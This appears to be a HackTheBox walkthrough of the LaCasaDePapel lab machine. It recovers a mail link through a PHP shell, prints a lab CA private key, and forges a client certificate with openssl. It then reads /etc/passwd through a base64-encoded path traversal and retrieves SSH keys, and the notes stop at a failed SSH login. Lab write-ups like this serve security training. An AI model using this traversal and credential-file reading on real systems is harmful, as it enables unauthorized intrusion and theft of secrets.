If we access to http://10.10.10.131/ we see a qr and an email field. After download google authenticator and introduce the token and email, pressing the "GET FREE TRIAL" button we don't get any email. This is obvious cause the htb machines don't have internet connection

![[Pasted image 20230927095053.png]]

Inspecting the shell retrieved in the FTP service, we found the email generated in the following directory

```bash
scandir('/home/oslo/Maildir/.Sent/cur');
=> [
     ".",
     "..",
     "1695800657034.M75459P68418V0000000000019966I0000000008bab77.lacasadepapel.htb,S=430,2,S",
   ]
readfile('/home/oslo/Maildir/.Sent/cur/1695800657034.M75459P68418V0000000000019966I0000000008bab77.lacasadepapel.htb,S=430,2,S');
Content-Type: text/plain; format=flowed
From: dali@lacasadepapel.htb
To: test@test.com
Content-Transfer-Encoding: 7bit
Date: Wed, 27 Sep 2023 07:44:17 +0000
Message-Id: <1695800657052-e8e43d61-c510bf14-b60ba3b6@lacasadepapel.htb>
MIME-Version: 1.0

Welcome to our community!
Thanks for signing up. To continue, please verify your email address by 
clicking the url below.
https://lacasadepapel.htb/a93a8ea0-5d09-11ee-ac80-7706e7b893d1
```

Accessing the url we found a certificate generator

![[Pasted image 20230927095341.png]]

We found a ca.key file in nairobi home folder

```bash
scandir('/home/nairobi');
=> [
     ".",
     "..",
     "ca.key",
     "download.jade",
     "error.jade",
     "index.jade",
     "node_modules",
     "server.js",
     "static",
   ]
readfile('/home/nairobi/ca.key');
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb
7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/
2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl
uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M
YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp
s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us
PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V
Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89
1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ
/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+
q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr
uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd
I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og
7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE
G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn
sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH
CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y
sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI
ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2
zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/
ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC
9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M
WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM
7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR
aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc
53udBEzjt3WPqYGkkDknVhjD
-----END PRIVATE KEY-----
```

Introduce it in the CA text field and generate the certificate to retrieve a crt file

![[Pasted image 20230927100318.png]]

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/LaCasaDePapel-10.10.10.131]
└─$ openssl pkcs12 -export -out certificate.pfx -inkey ftp-nairobi-ca.key -in web-generated-ca.crt -certfile web-generated-ca.crt 
Enter Export Password:
Verifying - Enter Export Password:

┌──(kali㉿kali)-[~/Documents/Boxes/LaCasaDePapel-10.10.10.131]
└─$ ls
certificate.pfx  ftp-nairobi-ca.key  web-generated-ca.crt
```

After import the pfx certificate in firefox, we access to https://10.10.10.131/ and we will be prompted to select our certificate to identify

![[Pasted image 20230927100748.png]]

And we are in

![[Pasted image 20230927100808.png]]

If we check the url redirect we can see the path is base64

![[Pasted image 20230927114107.png]]

So encode the file we want to retrieve

![[Pasted image 20230927114407.png]]

And going to the url (https://lacasadepapel.htb/file/Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==) we retrieve the file `/etc/passwd`. Here it is, filtered by potential bash users

```plain/text
root:x:0:0:root:/root:/bin/ash
operator:x:11:0:operator:/root:/bin/sh
postgres:x:70:70::/var/lib/postgresql:/bin/sh
dali:x:1000:1000:dali,,,:/home/dali:/usr/bin/psysh
berlin:x:1001:1001:berlin,,,:/home/berlin:/bin/ash
professor:x:1002:1002:professor,,,:/home/professor:/bin/ash
```

After some test we found that we are logged as berlin user

![[Pasted image 20230927114806.png]]

Lets retrieve ssh keys

![[Pasted image 20230927114928.png]]

And we got id_rsa file, but trying to login with ssh it asks for password, so the key is not working. Lets try other users (pick the ones retrieved before with `/etc/passwd`). 

